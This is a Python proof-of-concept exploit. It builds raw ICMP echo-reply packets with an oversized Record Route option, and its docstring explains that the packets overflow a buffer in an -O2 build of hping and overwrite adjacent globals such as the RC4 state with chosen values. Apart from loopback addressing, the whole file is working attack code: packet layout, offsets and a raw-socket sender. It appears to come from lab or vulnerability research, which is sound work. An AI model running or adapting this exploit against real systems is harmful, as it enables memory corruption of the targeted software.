#!/usr/bin/env python3
"""Loopback-only crafted ICMP RR reply for the -O2 pinned hping build.

At -O2 the globals after old_rr are j.0 (old_rr+64), i.1 (+68),
rc4_seedflag (+72) and random.c's rc4_sbox (+96).  With the W2 mapping
dest[46+n] == payload[n], payload[18..21] writes j, [22..25] writes i,
[26..29] writes seedflag and [50..204] writes sbox[0..154].
No source is edited; frames stay on 127.0.0.2 -> 127.0.0.1 on lo.
"""
import argparse
import socket
import struct
import time

from inject_rr import csum

LEAD = bytes(range(0xA0, 0xA0 + 18))
J = 0x07
I = 0x05
FILL = 0x41
TAIL_LEN = 155  # payload[50 .. 204] -> sbox[0 .. 154] at -O2


def frame(pid, rr_len, ptr):
    payload = LEAD
    payload += struct.pack("<I", J)
    payload += struct.pack("<I", I)
    payload += struct.pack("<I", 1)
    payload += bytes(range(0xB0, 0xB0 + 20))
    payload += bytes([FILL]) * TAIL_LEN
    assert len(payload) == 205
    icmp = struct.pack("!BBH", 0, 0, 0) + struct.pack("<H", pid & 0xFFFF)
    icmp += struct.pack("!H", 0) + payload
    opts = bytes([7, rr_len & 0xFF, ptr & 0xFF])
    opts += bytes(range(0xA0, 0xA0 + 36)) + b"\0"
    assert len(opts) == 40
    total_len = 20 + len(opts) + len(icmp)
    ip = struct.pack("!BBHHHBBH4s4s", 0x4F, 0, total_len, 0x1234, 0, 64, 1, 0,
                     socket.inet_aton("127.0.0.2"), socket.inet_aton("127.0.0.1"))
    ip += opts
    ip = ip[:10] + struct.pack("!H", csum(ip)) + ip[12:]
    return ip + icmp


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--pid", type=int, required=True)
    ap.add_argument("--rr-len", type=int, default=255)
    ap.add_argument("--ptr", type=int, default=255)
    ap.add_argument("--count", type=int, default=3)
    ap.add_argument("--gap", type=float, default=0.15)
    a = ap.parse_args()
    packet = frame(a.pid, a.rr_len, a.ptr)
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    try:
        for _ in range(a.count):
            s.sendto(packet, ("127.0.0.1", 0))
            time.sleep(a.gap)
    finally:
        s.close()
    print("injected %d -O2 index frames: j=%d i=%d fill=0x%02x pid=%d" %
          (a.count, J, I, FILL, a.pid))


if __name__ == "__main__":
    main()
